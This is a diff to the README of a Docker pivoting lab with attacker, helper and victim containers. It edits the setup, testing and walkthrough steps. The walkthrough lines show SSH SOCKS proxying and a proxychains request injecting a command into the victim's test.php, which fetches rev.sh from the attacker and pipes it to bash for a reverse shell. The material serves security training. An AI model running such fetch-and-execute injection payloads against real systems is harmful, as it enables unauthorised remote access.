@@ -5,16 +5,6 @@ This lab is made for testing attack container with 2 vulns, whichs are "Share ne
 
 
 ## Setup
-### Create secret-public ssh key pair
-```bash
-mkdir -p ./ssh-key ./authorized_keys
-ssh-keygen -t rsa -N "" -f ./ssh-key/id_rsa
-cp ./ssh-key/id_rsa.pub ./authorized_keys/authorized_keys
-chmod 644 ./authorized_keys/authorized_keys
-chmod -R 777 ./ssh-key
-chown nobody:nogroup ./ssh-key/id_rsa
-```
-
 ### Run the lab
 ```bash
 docker-compose up -d --build
@@ -28,12 +18,12 @@ docker exec -it attacker /bin/bash
 ## Testing
 1. From container `attacker` ping `helper`:
 ```bash
-docker exec -it attacker ping 172.16.100.11
+docker exec -it attacker ping 172.16.100.11 #helper IP
 ```
 
 2. From `attacker` ping `victim` fail:
 ```bash
-docker exec -it attacker ping 172.16.101.11
+docker exec -it attacker ping 172.16.101.11 #victim IP
 ```
 
 ## Walkthrough
@@ -164,7 +154,7 @@ We can determine that the IP 172.16.101.1 is the gateway's IP, 172.16.101.10 is 
 
 Back to our `attacker` machine. We are creating **dynamic port forwarding leverages the SOCKS proxy**. This will deliver all the traffic through an ssh connection, via, given port to the destination server. Here we are forwarding all the traffics to the attacker machine
 ```bash
-root@attacker:/etc# ssh -D 9050 root@172.16.100.11 -f -N
+root@attacker:/etc# ssh -D 9050 root@172.16.100.11 -Nf
 root@172.16.100.11's password:
 root@attacker:/etc#
 ```
@@ -233,7 +223,7 @@ python3 -m http.server 80
 
 On the third window, we send request with payload to `victim` to force them curl to the script and execute it
 ```bash
-proxychains4 -q http://172.16.101.11/test.php?cmd=curl%20-L%20http%3A%2F%2F172.16.101.10%3A80%2Frev.sh%20%7C%20%2Fbin%2Fbash
+proxychains4 -q curl http://172.16.101.11/test.php?cmd=curl%20-L%20http%3A%2F%2F172.16.101.10%3A80%2Frev.sh%20%7C%20%2Fbin%2Fbash
 ```
 
 Finally, we are into the `victim` machine
